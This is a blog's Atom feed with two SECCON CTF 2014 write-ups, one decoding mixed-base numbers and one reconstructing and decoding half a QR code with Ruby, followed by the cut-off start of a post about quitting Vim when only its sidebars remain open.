<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Yous]]></title>
  <link href="http://yous.be/atom.xml" rel="self"/>
  <link href="http://yous.be/"/>
  <updated>2014-12-09T06:30:43+09:00</updated>
  <id>http://yous.be/</id>
  <author>
    <name><![CDATA[Yous]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SECCON CTF 2014: Easy Cipher Write-up]]></title>
    <link href="http://yous.be/2014/12/09/seccon-ctf-2014-easy-cipher-write-up/"/>
    <updated>2014-12-09T00:11:30+09:00</updated>
    <id>http://yous.be/2014/12/09/seccon-ctf-2014-easy-cipher-write-up</id>
    <content type="html"><![CDATA[<h2>Crypto100 - Easy Cipher</h2>

<blockquote><p>87 101 108 1100011 0157 6d 0145 040 116 0157 100000 0164 104 1100101 32 0123 69 67 0103 1001111 1001110 040 062 060 49 064 100000 0157 110 6c 0151 1101110 101 040 0103 1010100 70 101110 0124 1101000 101 100000 1010011 1000101 67 0103 4f 4e 100000 105 1110011 040 116 1101000 0145 040 1100010 0151 103 103 0145 1110011 0164 100000 1101000 0141 99 6b 1100101 0162 32 0143 111 1101110 1110100 101 0163 0164 040 0151 0156 040 74 0141 1110000 1100001 0156 056 4f 0157 0160 115 44 040 0171 1101111 117 100000 1110111 0141 0156 1110100 32 0164 6f 32 6b 1101110 1101111 1110111 100000 0164 1101000 0145 040 0146 6c 97 1100111 2c 100000 0144 111 110 100111 116 100000 1111001 6f 117 63 0110 1100101 0162 0145 100000 1111001 111 117 100000 97 114 0145 46 1010011 0105 0103 67 79 1001110 123 87 110011 110001 67 110000 1001101 32 55 060 100000 110111 0110 110011 32 53 51 0103 0103 060 0116 040 5a 0117 73 0101 7d 1001000 0141 1110110 1100101 100000 102 0165 0156 33</p></blockquote>

<p>It looks like a set of numbers split with space. But there are multiple integer bases.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">nums</span> <span class="o">=</span> <span class="sx">%w(87 101 108 1100011 0157 6d 0145 040 116 0157 100000 0164 104 1100101</span>
</span><span class='line'><span class="sx">          32 0123 69 67 0103 1001111 1001110 040 062 060 49 064 100000 0157 110</span>
</span><span class='line'><span class="sx">          6c 0151 1101110 101 040 0103 1010100 70 101110 0124 1101000 101 100000</span>
</span><span class='line'><span class="sx">          1010011 1000101 67 0103 4f 4e 100000 105 1110011 040 116 1101000 0145</span>
</span><span class='line'><span class="sx">          040 1100010 0151 103 103 0145 1110011 0164 100000 1101000 0141 99 6b</span>
</span><span class='line'><span class="sx">          1100101 0162 32 0143 111 1101110 1110100 101 0163 0164 040 0151 0156</span>
</span><span class='line'><span class="sx">          040 74 0141 1110000 1100001 0156 056 4f 0157 0160 115 44 040 0171</span>
</span><span class='line'><span class="sx">          1101111 117 100000 1110111 0141 0156 1110100 32 0164 6f 32 6b 1101110</span>
</span><span class='line'><span class="sx">          1101111 1110111 100000 0164 1101000 0145 040 0146 6c 97 1100111 2c</span>
</span><span class='line'><span class="sx">          100000 0144 111 110 100111 116 100000 1111001 6f 117 63 0110 1100101</span>
</span><span class='line'><span class="sx">          0162 0145 100000 1111001 111 117 100000 97 114 0145 46 1010011 0105</span>
</span><span class='line'><span class="sx">          0103 67 79 1001110 123 87 110011 110001 67 110000 1001101 32 55 060</span>
</span><span class='line'><span class="sx">          100000 110111 0110 110011 32 53 51 0103 0103 060 0116 040 5a 0117 73</span>
</span><span class='line'><span class="sx">          0101 7d 1001000 0141 1110110 1100101 100000 102 0165 0156 33)</span>
</span><span class='line'><span class="n">str</span> <span class="o">=</span> <span class="n">nums</span><span class="o">.</span><span class="n">map</span> <span class="k">do</span> <span class="o">|</span><span class="n">s</span><span class="o">|</span>
</span><span class='line'>  <span class="n">ord</span> <span class="o">=</span> <span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;=</span> <span class="mi">5</span>
</span><span class='line'>          <span class="n">s</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>        <span class="k">elsif</span> <span class="n">s</span> <span class="o">=~</span> <span class="sr">/[a-f]/</span>
</span><span class='line'>          <span class="n">s</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span><span class='line'>        <span class="k">elsif</span> <span class="n">s</span><span class="o">.</span><span class="n">start_with?</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span><span class='line'>          <span class="n">s</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>          <span class="n">s</span><span class="o">.</span><span class="n">to_i</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>  <span class="n">ord</span><span class="o">.</span><span class="n">chr</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="nb">puts</span> <span class="n">str</span><span class="o">.</span><span class="n">join</span>
</span></code></pre></td></tr></table></div></figure>


<p>Just run with Ruby:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to the SECCON 2014 online CTF.The SECCON is the biggest hacker contest in Japan.Oops, you want to know the flag, don't you?Here you are.SECCON{W31C0M 70 7H3 53CC0N ZOIA}Have fun!</span></code></pre></td></tr></table></div></figure>


<p>Finally the flag is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SECCON{W31C0M 70 7H3 53CC0N ZOIA}</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SECCON CTF 2014: QR (Easy) Write-up]]></title>
    <link href="http://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up/"/>
    <updated>2014-12-07T19:02:51+09:00</updated>
    <id>http://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up</id>
    <content type="html"><![CDATA[<h2>QR200 - QR (Easy)</h2>

<blockquote><p>Funniest joke in the world(?):<br/>
&ldquo;Last night, I had a dream I was eating QR cakes&hellip;.<br/>
but when I woke up, half my QR code was gone!&rdquo;</p>

<p><img src="http://yous.be/images/2014/12/07/DSC01964_s.JPG" alt="QR (Easy)" /></p>

<hr />

<p>世界一面白いジョーク：<br/>
昨晩フランネルケーキを食べる夢を見たんだけど、<br/>
朝起きたらQRコードが半分なくなってたんだ！</p></blockquote>

<!-- more -->


<h2>First Look</h2>

<p>At first, we need clean image based on the image above.</p>

<p><img src="http://yous.be/images/2014/12/07/skeleton_qr.png" alt="Skeleton QR code" /></p>

<p>The size of this QR code is 29x29 and the size of version <em>V</em> is <em>N &times; N</em> with <em>N = 17 + 4V</em>, so this is version 3.</p>

<h2>Format Information</h2>

<p><img src="http://yous.be/images/2014/12/07/qr_format_information.png" alt="Format information" /></p>

<p>Note that the area indicates format information of QR code. Actually the format information is 15 bits long and the area has last 8 bits.</p>

<p><img src="http://yous.be/images/2014/12/07/format_information_bits.png" alt="Format information bits" /></p>

<p>Searching <a href="http://www.thonky.com/qr-code-tutorial/format-version-tables/#list-of-all-format-information-strings">the list of all format information strings</a>, we can find out that the type information bits are <code>001001110111110</code>. So this QR code has ECC level H and mask pattern 1.</p>

<h2>Off the Mask</h2>

<p>According to <a href="http://www.thonky.com/qr-code-tutorial/mask-patterns/">QR Mask Patterns Explained</a>, mask number 1 has formula <code>(row) mod 2 == 0</code>. Note that the row number start from 0. So we have to switch the bit of the row of which the coordinate is 0, 2, 4, &hellip;, 28.</p>

<p>Also there are fixed patterns in QR code, so we have to switch bits of data section only. See the data area and the bit order.</p>

<p><img src="http://yous.be/images/2014/12/07/QR_Ver3_Codeword_Ordering.svg" alt="QR Ver3 Codeword Ordering" /><br/>
(via <a href="http://commons.wikimedia.org/wiki/File:QR_Ver3_Codeword_Ordering.svg">wikipedia.org</a>)</p>

<p>So, the raw D1&ndash;D26 are:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">D1</span>  <span class="o">=</span> <span class="mb">0b11101100</span>
</span><span class='line'><span class="no">D14</span> <span class="o">=</span> <span class="mb">0b10000010</span>
</span><span class='line'><span class="no">D2</span>  <span class="o">=</span> <span class="mb">0b11111000</span>
</span><span class='line'><span class="no">D15</span> <span class="o">=</span> <span class="mb">0b10010101</span>
</span><span class='line'><span class="no">D3</span>  <span class="o">=</span> <span class="mb">0b00110110</span>
</span><span class='line'><span class="no">D16</span> <span class="o">=</span> <span class="mb">0b00111101</span>
</span><span class='line'><span class="no">D4</span>  <span class="o">=</span> <span class="mb">0b01110110</span>
</span><span class='line'><span class="no">D17</span> <span class="o">=</span> <span class="mb">0b01100010</span>
</span><span class='line'><span class="no">D5</span>  <span class="o">=</span> <span class="mb">0b00100010</span>
</span><span class='line'><span class="no">D18</span> <span class="o">=</span> <span class="mb">0b11101001</span>
</span><span class='line'><span class="no">D6</span>  <span class="o">=</span> <span class="mb">0b11110001</span>
</span><span class='line'><span class="no">D19</span> <span class="o">=</span> <span class="mb">0b10100001</span>
</span><span class='line'><span class="no">D7</span>  <span class="o">=</span> <span class="mb">0b00110111</span>
</span><span class='line'><span class="no">D20</span> <span class="o">=</span> <span class="mb">0b11100101</span>
</span><span class='line'><span class="no">D8</span>  <span class="o">=</span> <span class="mb">0b01010010</span>
</span><span class='line'><span class="no">D21</span> <span class="o">=</span> <span class="mb">0b11010101</span>
</span><span class='line'><span class="no">D9</span>  <span class="o">=</span> <span class="mb">0b00010111</span>
</span><span class='line'><span class="no">D22</span> <span class="o">=</span> <span class="mb">0b00101101</span>
</span><span class='line'><span class="no">D10</span> <span class="o">=</span> <span class="mb">0b11011110</span>
</span><span class='line'><span class="no">D23</span> <span class="o">=</span> <span class="mb">0b10010111</span>
</span><span class='line'><span class="no">D11</span> <span class="o">=</span> <span class="mb">0b01000100</span>
</span><span class='line'><span class="no">D24</span> <span class="o">=</span> <span class="mb">0b10001011</span>
</span><span class='line'><span class="no">D12</span> <span class="o">=</span> <span class="mb">0b01010100</span>
</span><span class='line'><span class="no">D25</span> <span class="o">=</span> <span class="mb">0b01111000</span>
</span><span class='line'><span class="no">D13</span> <span class="o">=</span> <span class="mb">0b11001101</span>
</span><span class='line'><span class="no">D26</span> <span class="o">=</span> <span class="mb">0b11000110</span>
</span></code></pre></td></tr></table></div></figure>


<p>After masking off,</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">D1</span>  <span class="o">=</span> <span class="mb">0b00100000</span>
</span><span class='line'><span class="no">D14</span> <span class="o">=</span> <span class="mb">0b01001110</span>
</span><span class='line'><span class="no">D2</span>  <span class="o">=</span> <span class="mb">0b00110100</span>
</span><span class='line'><span class="no">D15</span> <span class="o">=</span> <span class="mb">0b01011001</span>
</span><span class='line'><span class="no">D3</span>  <span class="o">=</span> <span class="mb">0b11111010</span>
</span><span class='line'><span class="no">D16</span> <span class="o">=</span> <span class="mb">0b00001110</span>
</span><span class='line'><span class="no">D4</span>  <span class="o">=</span> <span class="mb">0b01000101</span>
</span><span class='line'><span class="no">D17</span> <span class="o">=</span> <span class="mb">0b01010001</span>
</span><span class='line'><span class="no">D5</span>  <span class="o">=</span> <span class="mb">0b00010001</span>
</span><span class='line'><span class="no">D18</span> <span class="o">=</span> <span class="mb">0b11011010</span>
</span><span class='line'><span class="no">D6</span>  <span class="o">=</span> <span class="mb">0b00111101</span>
</span><span class='line'><span class="no">D19</span> <span class="o">=</span> <span class="mb">0b10010010</span>
</span><span class='line'><span class="no">D7</span>  <span class="o">=</span> <span class="mb">0b00000100</span>
</span><span class='line'><span class="no">D20</span> <span class="o">=</span> <span class="mb">0b11010101</span>
</span><span class='line'><span class="no">D8</span>  <span class="o">=</span> <span class="mb">0b10011110</span>
</span><span class='line'><span class="no">D21</span> <span class="o">=</span> <span class="mb">0b00011001</span>
</span><span class='line'><span class="no">D9</span>  <span class="o">=</span> <span class="mb">0b11010100</span>
</span><span class='line'><span class="no">D22</span> <span class="o">=</span> <span class="mb">0b00010001</span>
</span><span class='line'><span class="no">D10</span> <span class="o">=</span> <span class="mb">0b00010100</span>
</span><span class='line'><span class="no">D23</span> <span class="o">=</span> <span class="mb">0b00001110</span>
</span><span class='line'><span class="no">D11</span> <span class="o">=</span> <span class="mb">0b11011101</span>
</span><span class='line'><span class="no">D24</span> <span class="o">=</span> <span class="mb">0b00010010</span>
</span><span class='line'><span class="no">D12</span> <span class="o">=</span> <span class="mb">0b11010010</span>
</span><span class='line'><span class="no">D25</span> <span class="o">=</span> <span class="mb">0b00011111</span>
</span><span class='line'><span class="no">D13</span> <span class="o">=</span> <span class="mb">0b01010100</span>
</span><span class='line'><span class="no">D26</span> <span class="o">=</span> <span class="mb">0b01000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we can start decoding the data.</p>

<h2>Data Decoding</h2>

<p>There are <a href="http://www.thonky.com/qr-code-tutorial/data-encoding/#step-3-add-the-mode-indicator">mode indicators</a> for decoding:</p>

<ul>
<li><code>0001</code>: Numeric Mode (10 bits per 3 digits)</li>
<li><code>0010</code>: Alphanumeric Mode (11 bits per 2 characters)</li>
<li><code>0100</code>: Byte Mode (8 bits per character)</li>
<li><code>1000</code>: Kanji Mode (13 bits per character)</li>
<li><code>0111</code>: ECI Mode</li>
</ul>


<p><a href="http://www.thonky.com/qr-code-tutorial/data-encoding/#step-4-add-the-character-count-indicator">Character count indicator</a> follows after a mode indicator.</p>

<ul>
<li>Version 1&ndash;9

<ul>
<li>Numeric mode: 10 bits</li>
<li>Alphanumeric mode: 9 bits</li>
<li>Byte mode: 8 bits</li>
<li>Kanji mode: 8 bits</li>
</ul>
</li>
<li>Version 10&ndash;26

<ul>
<li>Numeric mode: 12 bits</li>
<li>Alphanumeric mode: 11 bits</li>
<li>Byte mode: 16 bits</li>
<li>Kanji mode: 10 bits</li>
</ul>
</li>
<li>Version 27&ndash;40

<ul>
<li>Numeric mode: 14 bits</li>
<li>Alphanumeric mode: 13 bits</li>
<li>Byte mode: 16 bits</li>
<li>Kanji mode: 12 bits</li>
</ul>
</li>
</ul>


<p>See the encoding process for each mode:</p>

<ul>
<li><a href="http://www.thonky.com/qr-code-tutorial/numeric-mode-encoding/">Numeric Mode Encoding</a></li>
<li><a href="http://www.thonky.com/qr-code-tutorial/alphanumeric-mode-encoding/">Alphanumeric Mode Encoding</a></li>
<li><a href="http://www.thonky.com/qr-code-tutorial/byte-mode-encoding/">Byte Mode Encoding</a></li>
<li><a href="http://www.thonky.com/qr-code-tutorial/kanji-mode-encoding/">Kanji Mode Encoding</a></li>
</ul>


<p>Let&rsquo;s start with above data D1&ndash;D26:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;00100000&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00110100&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;11111010&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;01000101&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00010001&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00111101&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00000100&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;10011110&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;11010100&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00010100&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;11011101&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;11010010&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;01010100&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;01001110&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;01011001&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00001110&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;01010001&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;11011010&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;10010010&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;11010101&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00011001&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00010001&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00001110&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00010010&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;00011111&#39;</span> <span class="p">\</span>
</span><span class='line'>       <span class="s1">&#39;01000000&#39;</span>
</span><span class='line'><span class="n">alphanumeric</span> <span class="o">=</span> <span class="s1">&#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ $%*+-./:&#39;</span><span class="o">.</span><span class="n">chars</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'>  <span class="n">str</span><span class="o">.</span><span class="n">slice!</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">kanji</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">num</span> <span class="o">&gt;=</span> <span class="mh">0x1740</span>
</span><span class='line'>    <span class="p">(</span><span class="mh">0xC140</span> <span class="o">+</span> <span class="n">num</span> <span class="o">/</span> <span class="mh">0xC0</span> <span class="o">*</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="n">num</span> <span class="o">%</span> <span class="mh">0xC0</span><span class="p">)</span>
</span><span class='line'>      <span class="o">.</span><span class="n">chr</span><span class="p">(</span><span class="no">Encoding</span><span class="o">::</span><span class="no">Shift_JIS</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="no">Encoding</span><span class="o">::</span><span class="no">UTF_8</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="p">(</span><span class="mh">0x8140</span> <span class="o">+</span> <span class="n">num</span> <span class="o">/</span> <span class="mh">0xC0</span> <span class="o">*</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="n">num</span> <span class="o">%</span> <span class="mh">0xC0</span><span class="p">)</span>
</span><span class='line'>      <span class="o">.</span><span class="n">chr</span><span class="p">(</span><span class="no">Encoding</span><span class="o">::</span><span class="no">Shift_JIS</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="no">Encoding</span><span class="o">::</span><span class="no">UTF_8</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kp">loop</span> <span class="k">do</span>
</span><span class='line'>  <span class="k">case</span> <span class="n">mode</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'>  <span class="k">when</span> <span class="s1">&#39;0010&#39;</span> <span class="c1"># Alphanumeric</span>
</span><span class='line'>    <span class="n">count</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="p">(</span><span class="n">count</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">times</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">chunk</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>      <span class="nb">print</span> <span class="n">alphanumeric</span><span class="o">[</span><span class="n">chunk</span> <span class="o">/</span> <span class="mi">45</span><span class="o">]</span> <span class="o">+</span> <span class="n">alphanumeric</span><span class="o">[</span><span class="n">chunk</span> <span class="o">%</span> <span class="mi">45</span><span class="o">]</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="nb">print</span> <span class="n">alphanumeric</span><span class="o">[</span><span class="n">read</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">]</span> <span class="k">if</span> <span class="n">count</span><span class="o">.</span><span class="n">odd?</span>
</span><span class='line'>  <span class="k">when</span> <span class="s1">&#39;0100&#39;</span> <span class="c1"># Byte</span>
</span><span class='line'>    <span class="n">count</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="n">count</span><span class="o">.</span><span class="n">times</span> <span class="k">do</span>
</span><span class='line'>      <span class="nb">print</span> <span class="n">read</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">chr</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">when</span> <span class="s1">&#39;1000&#39;</span> <span class="c1"># Kanji</span>
</span><span class='line'>    <span class="n">count</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="n">count</span><span class="o">.</span><span class="n">times</span> <span class="k">do</span>
</span><span class='line'>      <span class="nb">print</span> <span class="n">kanji</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">when</span> <span class="s1">&#39;0000&#39;</span> <span class="c1"># Terminate</span>
</span><span class='line'>    <span class="k">break</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="nb">fail</span> <span class="s2">&quot;Unhandled mode </span><span class="si">#{</span><span class="n">mode</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Fortunately, the QR code contains alphanumeric encoding and byte encoding only. You can get the flag by running above code with Ruby:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SECCON{PSwIQ9d9GjKTdD8H}</span></code></pre></td></tr></table></div></figure>


<h2>References</h2>

<ul>
<li><a href="http://en.wikipedia.org/wiki/QR_code">QR code on Wikipedia</a></li>
<li><a href="http://www.thonky.com/qr-code-tutorial/">QR Code Tutorial</a> by <a href="http://www.thonky.com">Thonky</a></li>
<li><a href="http://www.ams.org/samplings/feature-column/fc-2013-02">How to Read QR Symbols Without Your Mobile Telephone</a> by Bill Casselman</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Automatically Quit Vim if Actual Files are Closed]]></title>
    <link href="http://yous.be/2014/11/30/automatically-quit-vim-if-actual-files-are-closed/"/>
    <updated>2014-11-30T18:02:45+09:00</updated>
    <id>http://yous.be/2014/11/30/automatically-quit-vim-if-actual-files-are-closed</id>
    <content type="html"><![CDATA[<p><img src="http://yous.be/images/2014/11/30/vim.png" alt="Vim" /></p>

<h2>Sidebar</h2>

<p>Many Vim user use plugins which open sidebar like <a href="https://github.com/scrooloose/nerdtree">NERDTree</a> or <a href="https://github.com/vim-scripts/taglist.vim">Tag List</a>. In my case, I always open NERDTree and Tag List on Vim startup. Their file and tag navigation features are extremely handy.</p>

<p>We use <code>:q</code> to quit, <code>:q!</code> or <code>ZQ</code> to quit without saving, <code>:wq</code>, <code>:x</code> or <code>ZZ</code> to save and quit. But these commands are applied to only one buffer. NERDTree or Tag List windows are not closed until we close them individually or quit all using <code>:qa</code>.</p>

<h2>Getting into the Problem</h2>

